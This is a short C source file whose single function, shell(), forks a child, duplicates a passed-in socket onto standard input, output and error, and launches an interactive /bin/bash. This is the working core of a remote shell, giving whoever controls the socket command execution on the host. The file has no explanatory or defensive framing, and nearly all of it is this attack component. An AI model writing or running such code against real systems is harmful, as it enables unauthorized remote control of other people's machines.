#define _GNU_SOURCE
#include <stdlib.h>
#include <stdio.h>
#include <sys/types.h>
#include <sys/wait.h>

void shell(int sockfd){
  pid_t c_pid, w_pid;
  int status;

  c_pid = fork();

  if (c_pid > 0){  //parent
    while((w_pid = wait(&status)) > 0){}
    /*
    if( (pid = wait(&status)) < 0){
      perror("wait");
    }*/
  }else if( c_pid == 0 ){  //child
    for (int i = 0; i < 3; i++)
    {
        dup2(sockfd, i);
    }
    
    char * args[3];
		args[0] = "/bin/bash";
		args[1] = "-i";
		args[2] = '\0';
		execve(args[0], args, NULL);
    
    //execve("/bin/sh", NULL, NULL);
    perror("execv failed");  //only get here if exec failed
  }
  else{  //error: The return of fork() is negative
    perror("fork failed");
    _exit(2);
  }
}